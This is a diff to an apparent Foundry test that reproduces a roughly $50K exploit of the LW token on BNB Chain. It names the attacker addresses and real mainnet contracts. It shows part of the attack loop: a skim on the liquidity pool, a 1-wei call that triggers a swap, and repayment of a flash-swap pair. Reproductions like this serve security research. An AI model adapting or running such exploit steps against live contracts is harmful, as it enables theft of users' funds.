@@ -3,6 +3,10 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+
+import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
+import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
 // @KeyInfo - Total Lost : ~50K US$
 // Attacker : https://bscscan.com/address/0x4404de29913e0fd055190e680771a016777973e5
 // Attack Contract : https://bscscan.com/address/0xa4fbc2c95ac4240277313bf3f810c54309dfcd6c
@@ -32,7 +36,7 @@ contract ContractTest is Test {
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IUniswapV2Pair Pair = IUniswapV2Pair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
     IUniswapV2Pair LP = IUniswapV2Pair(0x6D2D124acFe01c2D2aDb438E37561a0269C6eaBB);
-    IUniswapV2Router Router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IUniswapV2Router Router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     address marketAddr = 0xae2f168900D5bb38171B01c2323069E5FD6b57B9;
 
     function setUp() public {
@@ -61,7 +65,7 @@ contract ContractTest is Test {
             LW.transfer(address(LP), transferAmount);
             LW.thanPrice();
             LP.skim(address(this));
-            payable(address(LW)).call{value: 1}(""); // Trigger the swap 3000e18 USDT to LW in the receive function
+            (bool success,) = payable(address(LW)).call{value: 1}(""); // Trigger the swap 3000e18 USDT to LW in the receive function
         }
         LWToUSDT();
         USDT.transfer(address(Pair), 1_002_507 * 1e18);
